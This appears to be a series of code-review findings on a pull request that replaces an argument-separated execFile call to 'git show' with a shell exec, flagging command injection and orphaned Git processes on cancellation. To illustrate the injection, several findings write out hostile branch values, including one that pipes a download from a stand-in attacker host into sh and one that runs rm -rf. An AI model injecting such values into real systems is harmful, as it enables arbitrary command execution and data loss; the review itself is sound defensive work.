findings.title: [P1] Keep the branch argument out of the shell
findings.body: When `branch` contains shell metacharacters, `exec()` evaluates them as shell syntax. For example, `HEAD; id` executes `id` with the application's privileges. The previous `execFile("git", ["show", branch])` passed the branch literally, so this PR introduces command injection.

findings.title: [P2] Keep Git as the owned child process for cancellation
findings.body: When a caller terminates the returned `ChildProcess`, `exec()` targets the intermediary shell rather than Git directly. On POSIX, Git can survive as an orphan and continue consuming CPU and I/O. The previous `execFile()` call returned the Git child directly.

findings.title: [P1] Keep the branch argument out of the shell
findings.body:
`exec` interprets `branch` as shell syntax. A value such as `missing;id` executes `id` after `git show`, allowing attacker-controlled branch input to run arbitrary commands and making the returned process status reflect the injected command rather than Git. Semicolons are also valid in Git ref names.

_Recommend validating this comment independently._

findings.title: [P1] Keep the branch argument out of the shell
findings.body:
`branch` is interpolated into a shell command, allowing arbitrary command execution. On POSIX, input such as `HEAD; rm -rf /tmp/example` executes the appended command with the application's privileges. The prior `execFile` call passed this value as a literal argument.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-separated execution to prevent shell command injection
findings.body:
`exec()` passes the interpolated branch name through a shell. Any caller-controlled branch value containing shell metacharacters (for example, `main; curl attacker/payload | sh`) executes arbitrary commands with the application’s privileges. The previous `execFile()` call treated the branch as a single Git argument.

_Recommend validating this comment independently._

findings.title: [P2] Keep Git as the owned child process so cancellation terminates it
findings.body:
`exec()` returns the intermediary shell process rather than `git`. On POSIX, callers invoking `kill()` on the returned `ChildProcess` terminate only that shell; a long-running `git show` can continue as an orphan. Repeated cancellation of large commit displays can therefore accumulate CPU and I/O work.

_Recommend validating this comment independently._
